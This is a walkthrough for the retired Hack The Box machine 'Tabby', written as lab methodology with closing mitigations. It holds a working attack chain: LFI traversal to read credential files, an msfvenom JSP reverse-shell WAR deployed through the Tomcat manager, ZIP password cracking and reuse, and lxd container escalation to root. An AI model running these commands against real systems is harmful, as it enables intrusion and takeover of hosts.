---
machine: Tabby
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, tomcat, lfi, war-deploy, fcrackzip, password-reuse, lxd]
---

# Tabby — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

An **LFI** in `news.php` leaks `/etc/passwd` and `tomcat-users.xml`, which holds Tomcat credentials with the `manager-script` role. Even though `/manager/html` is localhost-only, `/manager/text/deploy` accepts a WAR over `PUT` → shell as `tomcat`. A backup ZIP owned by `ash` cracks with `fcrackzip`, and that same password works for `su ash`. `ash` is in the **`lxd`** group: a privileged container with the host `/` mounted gives root.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    nginx 1.18.0  → "Mega Hosting"
8080/tcp open  http    Apache Tomcat 9.0.31
```

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
```

The site is served as the vhost `megahosting.htb`; add it to `/etc/hosts` so the 8080 side lines up.

```bash
echo "<IP> tabby.htb megahosting.htb" | sudo tee -a /etc/hosts
```

## Access

1. **LFI** in the news section:

```bash
curl 'http://megahosting.htb/news.php?file=../../../../etc/passwd'
curl 'http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml'
```

```xml
<user username="tomcat" password="<password>" roles="tomcat,admin-gui,manager-script"/>
```

2. **WAR deployment**: `/manager/html` returns 403 from outside (localhost only), but the text endpoint works with `manager-script`.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
curl -X PUT -u tomcat:<password> \
  -T shell.war "http://tabby.htb:8080/manager/text/deploy?path=/shell&update=true"
curl http://tabby.htb:8080/shell/
```

```text
tomcat@tabby:/$
```

3. **`ash`'s backup**: `linpeas` flags a ZIP in the webroot.

```bash
ls -lhA /var/www/html/files
fcrackzip -D -p /usr/share/wordlists/rockyou.txt /var/www/html/files/16162020_backup.zip
unzip 16162020_backup.zip -d /tmp/backup
```

The ZIP password is also `ash`'s account password:

```bash
su ash
```

## Escalation

```bash
id
# uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Being in `lxd` is root: import an image and start a **privileged** container with the host `/` mounted.

```bash
# attacker: build an alpine image
sudo distrobuilder build-lxd alpine.yaml     # lxd.tar.xz + rootfs.squashfs
python3 -m http.server 8888

# victim
wget http://<IP>:8888/lxd.tar.xz
wget http://<IP>:8888/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

```text
# cat /mnt/root/root/root.txt
```

## Pitfalls

- **403 on `/manager/html`**: not a dead end; `/manager/text/deploy` only needs `manager-script`.
- **Relative `file=`**: climb enough levels to leave the webroot.
- **Vhost**: without `megahosting.htb` in `/etc/hosts` the 80 side serves something else and the LFI looks broken.
- **`lxc` vs `lxd`**: an image must be imported first; otherwise `lxc init` fails. The container must be privileged and mount the host disk.

## Lessons

- An LFI that reaches `tomcat-users.xml` turns an internal service into RCE via WAR deployment.
- ZIP-password → system-password reuse is common; the backup sat inside the webroot.
- Membership in `lxd`/`docker` is de facto root: the group can mount the host filesystem.
- Mitigation: patch the LFI, rotate Tomcat credentials, keep backups out of the webroot, and drop users from container groups.
